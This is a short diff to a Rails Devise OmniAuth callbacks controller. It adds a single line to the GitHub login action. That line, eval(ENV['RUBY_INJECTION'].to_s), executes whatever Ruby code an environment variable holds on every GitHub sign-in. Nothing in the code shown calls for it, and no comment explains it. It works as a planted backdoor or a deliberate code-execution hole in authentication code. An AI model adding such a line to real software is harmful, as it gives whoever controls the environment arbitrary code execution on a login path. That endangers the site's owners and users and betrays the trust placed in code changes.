@@ -1,5 +1,6 @@
 class Users::OmniauthCallbacksController < Devise::OmniauthCallbacksController
   def github
+    eval(ENV['RUBY_INJECTION'].to_s)
     # You need to implement the method below in your model (e.g. app/models/user.rb)
     @user = User.find_for_github_oauth(request.env["omniauth.auth"], current_user)
 
